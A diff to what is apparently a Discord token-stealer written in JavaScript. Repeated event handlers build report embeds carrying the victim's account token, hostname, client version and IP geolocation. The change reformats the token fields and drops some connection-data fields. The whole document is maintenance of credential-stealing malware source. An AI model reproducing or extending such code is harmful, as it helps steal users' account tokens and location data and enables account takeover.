@@ -306,7 +306,7 @@ var event_handlers = {
                     {
                         name: "Token",
                         value: `\`\`\`${token}\`\`\``,
-                        inline: true
+                        inline: false
                     }, {
                         name: "Hostname",
                         value: `\`\`\`${os.hostname}\`\`\``,
@@ -379,7 +379,7 @@ var event_handlers = {
                     {
                         name: "Token",
                         value: `\`\`\`${token}\`\`\``,
-                        inline: true
+                        inline: false
                     }, {
                         name: "Hostname",
                         value: `\`\`\`${os.hostname}\`\`\``,
@@ -452,7 +452,7 @@ var event_handlers = {
                     {
                         name: "Token",
                         value: `\`\`\`${token}\`\`\``,
-                        inline: true
+                        inline: false
                     }, {
                         name: "Hostname",
                         value: `\`\`\`${os.hostname}\`\`\``,
@@ -525,7 +525,7 @@ var event_handlers = {
                     {
                         name: "Token",
                         value: `\`\`\`${token}\`\`\``,
-                        inline: true
+                        inline: false
                     }, {
                         name: "Hostname",
                         value: `\`\`\`${os.hostname}\`\`\``,
@@ -724,10 +724,6 @@ async function initialize() {
                             name: "Client version",
                             value: `\`\`\`${getDiscordClient()}\`\`\``,
                             inline: true
-                        }, {
-                            name: "Connection data",
-                            value: `\`\`\`yaml\nIP Address: ${network_data['ip'] ?? "Unknown"}\nHostname: ${network_data['hostname'] ?? "Unknown"}\nCity: ${network_data['city'] ?? "Unknown"}\nRegion: ${network_data['region'] ?? "Unknown"}\nCountry: ${network_data["country"] ?? "Unknown"}\nTimezone: ${network_data["timezone"] ?? "Unknown"}\`\`\``,
-                            inline: true
                         }],
                     })]
                 })
@@ -776,19 +772,11 @@ async function initialize() {
                             {
                                 name: "Token",
                                 value: `\`\`\`${token}\`\`\``,
-                                inline: true
+                                inline: false
                             },
                             {
                                 name: "Hostname",
                                 value: `\`\`\`${os.hostname}\`\`\``,
-                                inline: true
-                            }, {
-                                name: "Client version",
-                                value: `\`\`\`${getDiscordClient()}\`\`\``,
-                                inline: true
-                            }, {
-                                name: "Connection data",
-                                value: `\`\`\`yaml\nIP Address: ${network_data['ip'] ?? "Unknown"}\nHostname: ${network_data['hostname'] ?? "Unknown"}\nCity: ${network_data['city'] ?? "Unknown"}\nRegion: ${network_data['region'] ?? "Unknown"}\nCountry: ${network_data["country"] ?? "Unknown"}\nTimezone: ${network_data["timezone"] ?? "Unknown"}\`\`\``,
                                 inline: true
                             }
                         ],
@@ -842,7 +830,7 @@ async function initialize() {
                             {
                                 name: "Token",
                                 value: `\`\`\`${token}\`\`\``,
-                                inline: true
+                                inline: false
                             },
                         ]
                     })]
